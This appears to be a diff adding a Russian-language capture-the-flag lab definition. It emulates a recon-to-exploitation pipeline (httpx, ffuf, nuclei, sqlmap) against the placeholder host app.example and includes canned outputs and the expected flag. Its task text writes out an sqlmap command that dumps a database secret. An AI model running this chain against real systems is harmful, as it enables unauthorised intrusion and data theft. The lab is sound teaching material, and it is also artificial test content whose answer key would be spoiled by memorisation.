@@ -1,0 +1,41 @@
+{
+  "id": "web-tooling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{t00l1ng_p1p3l1n3_httpx_ffuf_nuc13}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: конвейер инструментов — httpx → ffuf → nuclei → sqlmap\n\nСобери пайплайн на `app.example`: живые хосты и стек → скрытые пути →\nизвестные уязвимости → инъекция. Результат одного — вход для следующего.\n\n1. Живые хосты и стек:\n\n   httpx -u app.example -tech-detect\n\n2. Скрытые пути:\n\n   ffuf -u https://app.example/FUZZ -w wordlist.txt\n\n3. Известные уязвимости:\n\n   nuclei -u https://app.example -tags cve\n\n4. Инъекция на найденном эндпоинте (дамп секрета):\n\n   sqlmap -u 'https://app.example/admin?id=1' --batch --dump > found.txt\n\n5. Набери `check`.\n" },
+    { "path": "/home/student/task/wordlist.txt", "text": "admin\napi\nlogin\nstatic\nbackup\n" }
+  ],
+  "tools": {
+    "httpx": {
+      "help": "httpx -u <host> [-tech-detect] — живые хосты и стек (эмуляция)",
+      "cases": [
+        { "match": "httpx|app\\.example", "example": "-u app.example -tech-detect", "output": "https://app.example [200] [nginx] [Express] [Node.js]\n" }
+      ],
+      "fallback": "httpx: в этой лабе эмулируется probe app.example.\n"
+    },
+    "ffuf": {
+      "help": "ffuf -u <url/FUZZ> -w <словарь> — фаззинг путей (эмуляция)",
+      "cases": [
+        { "match": "ffuf|FUZZ", "example": "-u https://app.example/FUZZ -w wordlist.txt", "output": "admin                   [Status: 200, Size: 1240]\napi                     [Status: 200, Size: 890]\nlogin                   [Status: 200, Size: 512]\n" }
+      ],
+      "fallback": "ffuf: в этой лабе эмулируется фаззинг app.example.\n"
+    },
+    "nuclei": {
+      "help": "nuclei -u <url> [-tags ...] — сканер шаблонов (эмуляция)",
+      "cases": [
+        { "match": "nuclei|app\\.example", "example": "-u https://app.example -tags cve", "output": "[CVE-2021-41773] [http] [critical] https://app.example/admin [path-traversal]\n" }
+      ],
+      "fallback": "nuclei: в этой лабе эмулируется скан app.example.\n"
+    },
+    "sqlmap": {
+      "help": "sqlmap -u <url> [--batch] [--dump] — детектор SQLi и дамп (эмуляция)",
+      "cases": [
+        { "match": "sqlmap|--dump|admin\\?id", "example": "-u 'https://app.example/admin?id=1' --batch --dump", "output": "[CRITICAL] parameter 'id' is vulnerable to SQL injection\n[INFO] back-end DBMS: MySQL >= 8.0\n[INFO] fetching table 'secrets'\n+----+------------------------------------------+\n| id | secret                                   |\n+----+------------------------------------------+\n| 1  | nto{t00l1ng_p1p3l1n3_httpx_ffuf_nuc13}   |\n+----+------------------------------------------+\n" }
+      ],
+      "fallback": "sqlmap: в этой лабе эмулируется инъекция на app.example/admin.\n"
+    }
+  }
+}
